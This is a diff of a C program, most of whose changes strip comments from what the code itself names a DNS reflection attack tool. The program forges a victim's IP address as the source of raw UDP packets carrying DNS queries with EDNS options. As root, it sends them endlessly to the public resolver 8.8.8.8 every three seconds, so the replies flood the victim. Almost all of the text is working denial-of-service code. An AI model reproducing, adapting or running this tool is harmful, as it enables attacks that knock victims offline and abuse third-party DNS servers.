@@ -12,13 +12,12 @@
 
 
 
-// Typedef the ip_headerdr and udp_headerdr from the netinet libs to prevent 
-// an infestation of "struct" in all the checksum and size calculations
+
 typedef struct iphdr ip_header;
 typedef struct udphdr udp_header;
 
 
-// Pseudoheader struct
+
 typedef struct
 {
     u_int32_t saddr;
@@ -28,18 +27,18 @@ typedef struct
     u_int16_t len;
 }ps_header;
 
-// DNS header struct
+
 typedef struct
 {
-    unsigned short dnshdr_id;       // ID
-    unsigned short dnshdr_flags;    // DNS Flags
-    unsigned short dnshdr_qcount;   // Question Count
-    unsigned short dnshdr_ans;      // Answer Count
-    unsigned short dnshdr_auth; // Authority RR
-    unsigned short dnshdr_add;      // Additional RR
+    unsigned short dnshdr_id;
+    unsigned short dnshdr_flags;
+    unsigned short dnshdr_qcount; 
+    unsigned short dnshdr_ans; 
+    unsigned short dnshdr_auth; 
+    unsigned short dnshdr_add;
 }dns_header;
 
-// Question types
+
 typedef struct
 {
     unsigned short dns_type;
@@ -61,7 +60,7 @@ void error(char *str)
     printf("%s\n",str);
 }
 
-// Taken from http://www.binarytides.com/raw-udp-sockets-c-linux/
+
 unsigned short csum(unsigned short *ptr,int nbytes) 
 {
     register long sum;
@@ -86,7 +85,7 @@ unsigned short csum(unsigned short *ptr,int nbytes)
     return(answer);
 }
 
-// Taken from http://www.binarytides.com/dns-quest_type-code-in-c-with-linux-sockets/
+
 void urlFormatTransform(unsigned char *after, unsigned char *before){
     strcat((char*)before,".");
     int i, j = 0; 
@@ -104,7 +103,7 @@ void urlFormatTransform(unsigned char *after, unsigned char *before){
 void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port,
     unsigned char *query_url)
 {
-    // Building the DNS request data packet
+    
     unsigned char dns_rcrd[32];
     unsigned char *dns_url1;
     dns_url1 = malloc(32);
@@ -140,7 +139,7 @@ void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dn
     dopt->Z = htons(0x8000);
     dopt->datalength = 0;
 
-    // Building the IP and UDP headers
+    
     char datagram[4096], *data, *psgram;
     memset(datagram, 0, 4096);
     
@@ -172,7 +171,7 @@ void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dn
     udp->len = htons(8+sizeof(dns_header)+(strlen(dns_url)+1)+sizeof(quest_type)+sizeof(dns_opt));
     udp->check = 0;
     
-    // Pseudoheader creation and checksum calculation
+    
     ps_header pshdr;
     pshdr.saddr = inet_addr(victim_ip);
     pshdr.daddr = sin.sin_addr.s_addr;
@@ -188,7 +187,7 @@ void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dn
         
     udp->check = csum((unsigned short *)psgram, pssize);
     
-    // Send data
+    
     int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if(sd==-1) error("Could not create socket.");
     else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
@@ -202,26 +201,21 @@ void usage(char *str);
 
 int main(int argc, char **argv)
 {   
-    // Initial uid check and argument count check
+    
     if(getuid()!=0)
         error("You must be running as root!");
     if(argc<3)
         usage(argv[0]);
     
-    // Assignments to variables from the given arguments
+    
     char *victim_ip = argv[1];
     int victim_port = atoi(argv[2]);
     char * dns_server = argv[3];
     int dns_port = 53;
-    // This code is just an example if you want to use a list of records 
-    // to resolve for the attack, or use a list of different DNS servers, etc
-    //while(1)
-        //dns_send(victim_ip, victim_port, dns_server, 53, dns_rcrd);
+    
     while(1) {
-        //reflectionAttack(victim_ip, victim_port, "8.8.8.8", 53, "ietf.org");
-        //reflectionAttack(victim_ip, victim_port, "8.8.8.8", 53, "www.amazon.com");
         reflectionAttack(victim_ip, victim_port, "8.8.8.8", 7, "ieee.org");
-sleep(3);
+        sleep(3);
     }   
     return 0;
 }
